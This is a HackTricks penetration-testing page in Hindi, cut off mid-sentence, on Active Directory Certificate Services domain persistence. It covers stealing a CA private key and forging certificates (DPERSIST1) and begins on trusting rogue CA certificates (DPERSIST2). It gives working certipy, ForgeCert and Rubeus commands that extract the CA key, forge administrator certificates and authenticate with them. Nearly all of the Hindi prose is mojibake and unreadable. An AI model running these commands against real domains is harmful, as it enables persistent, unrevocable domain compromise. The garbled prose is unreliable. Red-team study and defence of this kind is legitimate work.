# рдПрдбреА рд╕реАрдПрд╕ рдбреЛрдореЗрди рд╕реНрдерд┐рд░рддрд╛

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВред

</details>

**рдпрд╣ [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf) рдореЗрдВ рд╕рд╛рдЭрд╛ рдХреА рдЧрдИ рдбреЛрдореЗрди рд╕реНрдерд┐рд░рддрд╛ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢ рд╣реИ**ред рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рджреЗрдЦреЗрдВред

## рдЪреЛрд░реА рдЧрдИ рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдирд╛ - DPERSIST1

рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдХреИрд╕реЗ рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ?

рдпрд╣ рддрдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдПрдХ CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╣реИ рдЕрдЧрд░ рдХрдИ рд╢рд░реНрддреЗрдВ рдкреВрд░реА рд╣реЛрддреА рд╣реИрдВ:

- рдкреНрд░рдорд╛рдгрдкрддреНрд░ CA рд╕рд░реНрд╡рд░ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ, рдЬрд┐рд╕рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рдорд╢реАрди рдХреЗ DPAPI рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╛ рдпрджрд┐ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдЗрд╕реЗ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рддреЛ TPM/HSM рдЬреИрд╕реЗ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рджреНрд╡рд╛рд░рд╛ред
- рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рдЗрд╢реНрдпреВрд░ рдФрд░ рд╕рдмреНрдЬреЗрдХреНрдЯ рдлрд╝реАрд▓реНрдб CA рдХреЗ рд╡рд┐рднрд╛рдЬрди рдирд╛рдо рд╕реЗ рдореЗрд▓ рдЦрд╛рддреЗ рд╣реИрдВред
- "CA рд╕рдВрд╕реНрдХрд░рдг" рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗрд╡рд▓ CA рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред
- рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ Extended Key Usage (EKU) рдлрд╝реАрд▓реНрдб рдЧрд╛рдпрдм рд╣реИред

рдЗрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, CA рд╕рд░реНрд╡рд░ рдкрд░ `certsrv.msc` рдЙрдкрдХрд░рдг рдмрд┐рд▓реНрдЯ-рдЗрди GUI рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдорд░реНрдерд┐рдд рд╡рд┐рдзрд┐ рд╣реИред рдлрд┐рд░ рднреА, рдпрд╣ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдЕрдиреНрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рд╕реЗ рдЕрд▓рдЧ рдирд╣реАрдВ рд╣реИ; рдЗрд╕рд▓рд┐рдП, рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП [THEFT2 рддрдХрдиреАрдХ](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) рдХреА рддрдХрдиреАрдХ рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдЗрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде Certipy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
рдЬрдм CA рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдФрд░ рдЗрд╕рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЛ `.pfx` рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ [ForgeCert](https://github.com/GhostPack/ForgeCert) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
{% hint style="warning" %}
рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬрд╛рд▓реАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд▓рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рд╕рдХреНрд░рд┐рдп рд╣реЛ рдФрд░ рд╕рдХреНрд╖рдо рд╣реЛ Active Directory рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред krbtgt рдЬреИрд╕реЗ рд╡рд┐рд╢реЗрд╖ рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬрд╛рд▓реАрдХрд░рдг рдХрд░рдирд╛ рдЕрдкреНрд░рднрд╛рд╡реА рд╣реИред
{% endhint %}

рдпрд╣ рдЬрд╛рд▓реАрдХреГрдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ **рд╡реИрдз** рд╣реЛрдЧрд╛ рдЬрдм рддрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рдорд╛рдкреНрддрд┐ рддрд┐рдерд┐ рддрдХ рд╣реЛрдЧрд╛ рдФрд░ **рдореВрд▓ рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╡реИрдз** рд╣реЛрдЧрд╛ (рд╕рд╛рдорд╛рдиреНрдпрдд: 5 рд╕реЗ **10+ рд╡рд░реНрд╖** рддрдХ)ред рдпрд╣ **рдорд╢реАрдиреЛрдВ** рдХреЗ рд▓рд┐рдП рднреА рд╡реИрдз рд╣реИ, рдЗрд╕рд▓рд┐рдП **S4U2Self** рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдорд╢реАрди рдкрд░ **рд╕реНрдерд┐рд░рддрд╛ рдмрдирд╛рдП рд░рдЦ рд╕рдХрддрд╛ рд╣реИ** рдЬрдм рддрдХ рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╡реИрдз рд╣реИред\
рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЗрд╕ рд╡рд┐рдзрд┐ рд╕реЗ **рдЙрддреНрдкрдиреНрди рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ** рдХреЛ **рд░рджреНрдж рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рдХреНрдпреЛрдВрдХрд┐ рд╕реАрдП рдЙрдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдЧрд░реВрдХ рдирд╣реАрдВ рд╣реИред

## рдзреЛрдЦрд╛рдзрдбрд╝реА рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ - DPERSIST2

`NTAuthCertificates` рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ **рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ** рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА (рдПрдбреА) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рджреНрд╡рд╛рд░рд╛ рд╕рддреНрдпрд╛рдкрди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ `NTAuthCertificates` рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЪреЗрдХ рдХрд░рдирд╛ рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдЖрдИрд╢реВрдЕрд░ рдлрд╝реАрд▓реНрдб рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реАрдП рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдХреЛрдИ рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЬрд╛рд░реА рд░рд╣рддрд╛ рд╣реИред

рдПрдХ рдЖрддреНрдо-рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ `NTAuthCertificates` рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрд┐ рдЙрдирдХреЗ рдкрд╛рд╕ рдЗрд╕ рдПрдбреА рдСрдмреНрдЬ
